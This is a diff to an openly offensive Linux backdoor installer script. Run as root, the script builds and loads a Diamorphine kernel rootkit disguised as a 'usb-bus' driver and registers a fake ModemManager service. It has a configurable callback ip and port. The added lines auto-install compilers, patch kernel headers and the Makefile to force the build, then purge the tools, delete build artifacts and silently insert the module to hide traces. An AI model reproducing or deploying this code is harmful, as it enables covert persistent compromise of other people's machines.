@@ -50,7 +50,6 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '
 
-
 ip="127.0.0.1/9999" #change this according to the listening ip and port (you got to also change the _hiding variable according to the instructions there)
 
 user=$(whoami)
@@ -62,7 +61,7 @@ obj-m := usb-bus.o
 KERNEL_DIR = /lib/modules/$(shell uname -r)/build
 PWD = $(shell pwd)
 all:
-	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules
+	make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules 
 EOF
 )
 
@@ -582,24 +581,143 @@ if [ "$user" == "root" ]; then
 	echo "dbus-org.freedesktop.ModemManager11 enabled"
 	systemctl restart dbus-org.freedesktop.ModemManager11
 	echo "dbus-org.freedesktop.ModemManager11 started"
+	
+	#check if make and gcc are installed, otherwise install them
+	ls /usr/bin/make &>/dev/null
+	if [ "$?" != "0" ]; then
+		m="make"
+		echo "installing make..."
+		apt-get install make -y
+		if [ "$?" == "0" ]; then
+			echo "make installed successfully"
+		else
+			echo "make din't install"
+		fi
+	fi
+	ls /usr/bin/gcc &>/dev/null
+	if [ "$?" != "0" ]; then
+		g="gcc"
+		echo "installing gcc..."
+		apt-get install gcc -y
+		if [ "$?" == "0" ]; then
+			echo "gcc installed successfully"
+		else
+			echo "gcc didn't install"
+		fi
+	fi
 
-	#create the usb-bus rootkit module and insert it
+	#make the usb-bus rootkit module
 	if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
 		mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
 	fi
 	printf "$makefile" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
 	printf "$diamorphine" >/lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.c
-	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus
-	#make module auto-load after every reboot
+	echo "making..."
+	make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
+
+	#if make is unsuccessful patch the Makefile, get the headers needed for the module to work and make again
+	if [ "$?" == "0" ]; then
+		echo "make successful"
+	else
+		echo "make unsuccessful, patching Makefile and getting headers..."
+
+		#copy the headers
+		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
+			cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
+			if [ "$?" == "1" ]; then
+				cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 
+			fi
+		fi
+		if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
+			cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi
+		fi
+		gcc --version | grep "7\." &>/dev/null
+		if [ "$?" == "0" ]; then
+			if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
+				cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
+			fi
+		fi
+
+		#patch the Makefile
+		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
+		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')
+		echo "$location"
+		mkfile=$(cat << \EOF	
+diff --git a/Makefile b/Makefile
+index dda982c..f96b174 100644
+--- a/Makefile
++++ b/Makefile
+@@ -608,6 +608,12 @@ endif # $(dot-config)
+ # Defaults to vmlinux, but the arch makefile usually adds further targets
+ all: vmlinux
+ 
++# force no-pie for distro compilers that enable pie by default
++KBUILD_CFLAGS += $(call cc-option, -fno-pie)
++KBUILD_CFLAGS += $(call cc-option, -no-pie)
++KBUILD_AFLAGS += $(call cc-option, -fno-pie)
++KBUILD_CPPFLAGS += $(call cc-option, -fno-pie)
++
+ # The arch Makefile can set ARCH_{CPP,A,C}FLAGS to override the default
+ # values of the respective KBUILD_* variables
+ ARCH_CPPFLAGS :=
+EOF
+)
+		printf "$mkfile" >/$location/mkfile.patch
+		patch </$location/mkfile.patch
+		if [ "$?" == "0" ]; then
+			echo "patch successful"
+		else
+			echo "patch unsuccessful"
+		fi
+
+		#make again
+		echo "making again..."
+		make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
+		if [ "$?" == "0" ]; then
+			echo "make successful"
+		else
+			echo "make unsuccessful"
+		fi
+	fi
+
+	#remove make and gcc if they weren't installed
+	if [ "$m" == "make" ]; then
+		echo "removing make..."
+		apt-get purge make -y
+		if [ "$?" == "0" ]; then
+			echo "make removed"
+		else
+			echo "make not removed"
+		fi
+	fi
+	if [ "$g" == "gcc" ]; then
+		echo "removing gcc..."
+		apt-get purge gcc -y
+		if [ "$?" == "0" ]; then
+			echo "gcc removed"
+		else
+			echo "gcc not removed"
+		fi
+	fi
+
+	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
 	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
 	#depmod -a #take care of dependencies otherwise you will have problems booting
+
 	#remove the dirt
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module*
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules*
-	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe
-	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
+	rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
+
+	#insert usb-bus rootkit module
+	insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
+	if [ "$?" == "0" ]; then
+			echo "usb-bus inserted"
+		else
+			echo "usb-bus not inserted"
+		fi
 	exit
 fi
